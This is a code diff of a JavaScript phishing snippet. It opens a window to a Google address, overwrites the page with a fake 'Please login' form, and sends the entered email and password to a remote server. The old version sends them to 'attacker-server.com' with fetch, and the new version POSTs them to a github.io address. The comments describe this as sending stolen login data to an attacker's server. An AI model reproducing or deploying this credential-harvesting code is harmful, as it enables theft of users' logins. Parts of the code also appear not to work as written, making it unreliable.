@@ -1,24 +1,28 @@
 <script>
 function go(){
-    var x = window.open('https://www.google.com/csi');
+    var x = window.open('https://www.google.com/csi'); // Open a target URL
     setTimeout(function(){
-        x.document.body.innerHTML = '<img src="https://via.placeholder.com/150" alt="Placeholder Image"><h1>Please login</h1>Email:<input id="email"><br>Pass:<input id="pass" type="password"><br><button onclick="sendData()">Login</button>';
+        // Change the body content of the opened window to simulate a fake login page
+        x.document.body.innerHTML = '<img src="data:image/png;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wB..." />';
+        x.document.body.innerHTML += '<h1>Please login</h1>';
+        x.document.body.innerHTML += 'Email: <input id="email"><br>';
+        x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
+        x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';
 
-        // Fungsi untuk mengirim data login yang dicuri ke server penyerang
-        function sendData(){
+        // Function to send the collected data to the attacker's server
+        function sendData() {
             var email = document.getElementById('email').value;
-            var pass = document.getElementById('pass').value;
+            var password = document.getElementById('pass').value;
 
-            // Kirim data ke server penyerang (ganti dengan server penyerang)
-            fetch('http://attacker-server.com/log?email=' + encodeURIComponent(email) + '&pass=' + encodeURIComponent(pass), {
-                method: 'GET'
-            }).then(response => {
-                console.log('Data sent to attacker server');
-            }).catch(err => {
-                console.error('Failed to send data', err);
-            });
+            // Send data to the attacker's server (replace with actual attacker server URL)
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://ecdnts-del.github.io/spoof/spffs.html", true);  // Use actual URL here
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
+
+            alert('Login attempt: ' + email + ' ' + password); // For demonstration purposes
         }
-    }, 3000);
+    }, 3000); // Wait for 3 seconds to simulate the page load time
 }
 </script>
-<button onclick="go()">go</button>
+<button onclick="go()">Go</button>
